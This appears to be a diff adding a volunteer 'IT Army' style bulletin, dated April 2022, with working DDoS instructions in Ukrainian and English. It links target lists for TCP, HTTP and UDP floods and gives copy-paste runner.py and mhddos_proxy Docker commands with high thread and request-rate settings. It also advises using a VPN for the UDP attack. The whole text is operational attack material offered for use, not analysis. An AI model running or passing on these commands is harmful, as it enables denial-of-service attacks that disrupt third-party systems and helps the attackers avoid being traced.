@@ -1,0 +1,35 @@
+`Добрий день,ми з 🇺🇦! / Hello we are from  🇺🇦!
+
+Команди з актуальними цілями на 2022-Apr-10 10:03:47
+Інструукції - `https://itarmy.com.ua/instruction/`
+Списки для атаки(виберіть той, щро підходить вам, та підставке в команду):
+--------------------------
+!!`**TCP(L4):**`!!
+
+https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_80.lst - TCP з'єднання на 80 порт
+https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_443.lst - TCP з'єднання на 443 порт
+https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_other.lst - TCP з'єднання на всі інші порти
+https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l4_tcp_all.lst -TCP з'єднання на всі порт
+
+Команда :`
+python3 runner.py -t 2000 --rpc 1000 --table -c <сюда вставити обраний  список для атаки>
+docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 --table -c <сюда вставити обраний  список для атаки>
+--------------------------
+!!**HTTP(L7):**`!!
+
+https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l7_80.lst - HTTP з'єднання на 80 порт
+https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l7_443.lst - HTTPs з'єднання на 443 порт
+https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l7_all.lst- HTTP з'єднання на 80 та 443 порти по всім цілям
+
+Команда : `
+python3 runner.py -t 2000 --rpc 1000  --table --http-methods STRESS GET -c <сюда вставити обраний  список для атаки>
+docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 --table --http-methods STRESS GET -c <сюда вставити обраний  список для атаки>
+
+!!**UDP:**`!! Не запускати без ВПН \Don't start without VPN
+
+Команда : `
+python3 runner.py -t 2000 --rpc 1000 --table --vpn -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/udp.lst
+docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 --vpn --table -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/udp.lst
+
+`Для Windows замініть python3 на python`
+
